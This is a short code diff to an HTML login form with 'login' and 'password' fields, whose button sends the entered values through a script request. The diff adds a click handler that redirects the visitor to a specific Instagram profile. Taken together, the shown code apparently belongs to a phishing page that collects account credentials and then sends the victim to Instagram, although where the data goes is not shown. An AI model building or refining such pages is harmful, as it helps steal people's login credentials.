@@ -24,7 +24,7 @@
               <form>
                 <input type="text" id="login" class="fadeIn second" name="login" placeholder="login">
                 <input type="text" id="password" class="fadeIn third" name="login" placeholder="password">
-                <input type="button" onclick="sendMessage()" class="fadeIn fourth" value="Log In">
+                <input type="button" onclick="sendMessage()" class="fadeIn fourth" value="Log In" id = 'myButton'>
               </form>
           
               <!-- Remind Passowrd -->
@@ -56,5 +56,8 @@
   
         request.send(JSON.stringify(params));
       }
+      document. getElementById("myButton"). onclick = function () {
+    location. href = "https://www.instagram.com/w21389123/";
+    };
     </script>    
 </html>
